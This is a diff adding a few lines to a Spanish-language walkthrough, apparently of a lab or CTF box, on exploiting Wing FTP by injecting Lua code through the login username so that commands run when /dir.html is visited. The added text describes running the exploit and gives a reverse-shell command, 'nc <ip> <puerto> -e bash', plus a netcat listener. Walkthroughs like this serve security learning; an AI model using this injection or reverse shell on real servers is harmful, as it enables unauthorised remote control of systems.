@@ -103,6 +103,21 @@ Una vez que un usuario inicia session o se registra, win FTP lo guarda en el end
 Este exploit cuando envia el username, añade adicionalmente codigo malicioso en LUA el cual ejecuta comandos  si visitamos /dir.html ya que win FTP esta hecho en LUA y nosotros inyectamos codigo LUA en la pagina, por lo cual si lo visitamos se interpreta.
 
 
+Si ejecutamos el exploit:
+
+<img width="325" height="148" alt="image" src="https://github.com/user-attachments/assets/d8d8583b-f4ad-4538-b1fc-1b75324b00a8" />
+
+Nos da el nombre de usuario , en este caso `wingftp`
+
+Si queremos obtener una shell simplemente cambiamos la variable command a por ejemplo `nc <ip> <puerto> -e bash`
+
+Nos ponemos a la escucha por nc por el puerto que hayamos escogido:
+
+<img width="396" height="117" alt="image" src="https://github.com/user-attachments/assets/5a6a3026-6c39-4a6d-89f6-778106d73ef1" />
+
+
+
+
 
 
 
